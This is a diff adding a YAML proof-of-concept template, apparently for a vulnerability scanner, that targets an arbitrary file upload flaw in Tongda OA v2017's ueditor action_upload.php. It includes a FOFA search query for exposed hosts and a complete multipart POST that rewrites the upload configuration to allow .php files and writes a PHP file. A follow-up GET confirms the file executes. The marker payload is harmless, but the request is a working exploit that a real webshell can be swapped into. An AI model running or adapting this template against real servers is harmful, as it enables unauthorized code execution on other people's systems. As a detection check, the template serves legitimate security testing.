@@ -1,0 +1,44 @@
+info:
+  vulId: tongda_fileupload_action
+  detail: 通达OA v2017 action_upload.php 任意文件上传漏洞
+  fofaQuery: app="TDXK-通达OA"
+rules:
+  - request:
+      payload:
+        - "<?php echo 12345678910;?>"
+      path: "{{rootUrl}}/module/ueditor/php/action_upload.php?action=uploadfile"
+      method: POST
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36
+        Referer: "{{rootUrl}}"
+        Content-type: multipart/form-data; boundary=---------------------------55719851240137822763221368724
+        Accept: application/json, text/javascript, */*; q=0.01
+      redirect: false
+      dataType: text
+      data: "-----------------------------55719851240137822763221368724\r\nContent-Disposition: form-data; name=\"CONFIG[fileFieldName]\"\r\n\r\nffff\r\n-----------------------------55719851240137822763221368724\r\nContent-Disposition: form-data; name=\"CONFIG[fileMaxSize]\"\r\n\r\n1000000000\r\n-----------------------------55719851240137822763221368724\r\nContent-Disposition: form-data; name=\"CONFIG[filePathFormat]\"\r\n\r\nmlkiohgd\r\n-----------------------------55719851240137822763221368724\r\nContent-Disposition: form-data; name=\"CONFIG[fileAllowFiles][]\"\r\n\r\n.php\r\n-----------------------------55719851240137822763221368724\r\nContent-Disposition: form-data; name=\"ffff\"; filename=\"test.php\"\r\nContent-Type: application/octet-stream\r\n\r\n{{payload}}\r\n-----------------------------55719851240137822763221368724\r\nContent-Disposition: form-data; name=\"mufile\"\r\n\r\nsubmit\r\n-----------------------------55719851240137822763221368724--"
+    checksCondition: and
+    checks:
+      - checkType: status
+        desireds:
+          - 200
+        condition: and
+
+  - request:
+      path: "{{rootUrl}}/mlkiohgd.php"
+      method: GET
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36
+      redirect: false
+      dataType: text
+    checksCondition: and
+    checks:
+      - checkType: string
+        desireds:
+          - 12345678910
+        place: body
+        condition: and
+
+      - checkType: status
+        desireds:
+          - 200
+        condition: and
